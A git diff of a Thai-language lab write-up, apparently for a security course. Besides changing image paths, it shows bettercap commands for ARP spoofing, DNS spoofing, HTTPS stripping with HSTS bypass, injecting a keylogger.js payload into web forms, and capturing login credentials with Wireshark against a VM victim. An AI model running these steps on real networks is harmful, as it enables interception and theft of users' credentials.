@@ -78,7 +78,7 @@ set dns.spoof.domains         google.corn, *.google.corn, bank-example.com, *.ba
 - `replacements` — โดเมนหลอก (`.com` → `.corn`) ใช้ bypass HSTS
 - `dns.spoof.domains` — โดเมนที่จะปลอม DNS response
 
-![Lab1 · caplet config]()
+![Lab1 · caplet config](img/caplet-config.png)
 
 ### ขั้นตอนที่ 2 — เริ่ม bettercap + สแกนเครือข่าย
 
@@ -92,11 +92,11 @@ net.show          # แสดงตาราง IP / MAC / vendor ที่พ�
 
 จากตาราง `net.show` หา IP เครื่องเหยื่อ → **`192.168.174.130`** (WINVIM, VMware)
 
-![Lab1 · net.probe / net.show](images/lab1_02_netshow.png)
+![Lab1 · net.probe / net.show](img/lab1_02_netshow.png)
 
 ยืนยัน IP ฝั่งเหยื่อด้วย `ipconfig` บน Windows VM (IPv4 Address = `192.168.174.130`):
 
-![Lab1 · victim ipconfig](images/lab1_03_ipconfig.png)
+![Lab1 · victim ipconfig](img/lab1_03_ipconfig.png)
 
 ### ขั้นตอนที่ 3 — ARP spoofing (full duplex)
 
@@ -108,7 +108,7 @@ arp.spoof on
 ```
 เมื่อสำเร็จ traffic ของเหยื่อจะวิ่งผ่านเครื่อง attacker ก่อนออก gateway
 
-![Lab1 · arp.spoof on](images/lab1_04_arpspoof.png)
+![Lab1 · arp.spoof on](img/lab1_04_arpspoof.png)
 
 ### ขั้นตอนที่ 4 — Sniff + HSTS hijack
 
@@ -118,17 +118,17 @@ net.sniff on
 hstshijack/hstshijack         # รัน caplet: strip HTTPS + bypass HSTS
 ```
 
-![Lab1 · net.sniff](images/lab1_05_sniff.png)
+![Lab1 · net.sniff](img/lab1_05_sniff.png)
 
 `hstshijack` โหลด config จากขั้นตอนที่ 1 → เมื่อเหยื่อเข้า `bank-example.com` จะถูก downgrade เป็น HTTP (browser ขึ้น "ไม่ปลอดภัย")
 
-![Lab1 · hstshijack output](images/lab1_06_hstshijack.png)
+![Lab1 · hstshijack output](img/lab1_06_hstshijack.png)
 
 ### ขั้นตอนที่ 5 — ฝั่งเหยื่อเข้าเว็บ + กรอก login
 
 บน Windows VM เปิด browser เข้าเว็บเป้าหมาย — สังเกต address bar ขึ้นเตือน **"ไม่ปลอดภัย"** (โดน HTTP downgrade) แล้วเหยื่อกรอก username/password
 
-![Lab1 · victim login page](images/lab1_07_victim.png)
+![Lab1 · victim login page](img/lab1_07_victim.png)
 
 ### ขั้นตอนที่ 6 — วิเคราะห์ด้วย Wireshark
 
@@ -137,11 +137,11 @@ hstshijack/hstshijack         # รัน caplet: strip HTTPS + bypass HSTS
 ip.addr == 192.168.174.130 and http.request.method == "POST"
 ```
 
-![Lab1 · wireshark POST filter](images/lab1_08_wireshark.png)
+![Lab1 · wireshark POST filter](img/lab1_08_wireshark.png)
 
 ขยาย packet POST → ดู HTML Form URL Encoded จะเห็น field ของฟอร์ม login เป็น **cleartext**:
 
-![Lab1 · captured credentials](images/lab1_09_creds.png)
+![Lab1 · captured credentials](img/lab1_09_creds.png)
 
 **ผลลัพธ์** (ค่า dummy ที่กรอกทดสอบเอง):
 ```
@@ -165,8 +165,6 @@ set hstshijack.payloads   *:/usr/share/bettercap/caplets/hstshijack/payloads/key
 ```
 `keylogger.js` = สคริปต์ที่จะถูก inject เข้าทุกฟอร์มบนหน้าเว็บเป้าหมาย เก็บทุกปุ่มที่พิมพ์
 
-![Lab2 · payload config](images/lab2_01_payload.png)
-
 ### ขั้นตอนที่ 2 — bettercap + สแกน (เหมือน Lab 1)
 
 ```bash
@@ -177,8 +175,6 @@ net.probe on
 net.show          # victim = 192.168.174.137
 ```
 
-![Lab2 · net.probe / net.show](images/lab2_02_netshow.png)
-
 ### ขั้นตอนที่ 3 — ARP spoofing
 
 ```
@@ -186,8 +182,6 @@ set arp.spoof.fullduplex true
 set arp.spoof.targets 192.168.174.137
 arp.spoof on
 ```
-
-![Lab2 · arp.spoof](images/lab2_03_arpspoof.png)
 
 ### ขั้นตอนที่ 4 — Sniff + hstshijack (inject keylogger)
 
@@ -198,8 +192,6 @@ hstshijack/hstshijack
 ```
 caplet จะ inject `keylogger.js` เข้า traffic HTTP ที่ถูก strip
 
-![Lab2 · hstshijack output](images/lab2_04_hstshijack.png)
-
 ### ขั้นตอนที่ 5 — ตั้ง Wireshark Capture Filter
 
 เลือก interface `eth0` → ตั้ง capture filter:
@@ -207,23 +199,15 @@ caplet จะ inject `keylogger.js` เข้า traffic HTTP ที่ถูก
 ip.addr == 192.168.174.137 and http.request.method == "POST"
 ```
 
-![Lab2 · wireshark capture setup](images/lab2_05_wireshark_setup.png)
-
 ### ขั้นตอนที่ 6 — เหยื่อเข้าเว็บ + กรอก login
 
 บน Windows VM เข้าเว็บเป้าหมาย (`shop-example.com`) ที่ถูกปลอม — browser ขึ้น "ไม่ปลอดภัย" แล้วเหยื่อกรอก credential
-
-![Lab2 · victim login page](images/lab2_06_victim.png)
 
 ### ขั้นตอนที่ 7 — เปรียบเทียบผล: hash vs plaintext
 
 **ถ้าไม่ใช้ keylogger** — password ที่ดักได้ถูก hash (เช่น `password: cdf4a007e2b02a0c49fc9b7ccfbb8a10c644f635e1765dcf2a7ab794ddc7edac`) ต้องเอาไป crack:
 
-![Lab2 · hashed password](images/lab2_07_hashed.png)
-
 **เมื่อใช้ keylogger payload** — ดัก keystroke ได้ plaintext ตรง ๆ ไม่ต้อง crack:
-
-![Lab2 · plaintext via keylogger](images/lab2_08_plaintext.png)
 
 **ผลลัพธ์** (ค่า dummy):
 ```
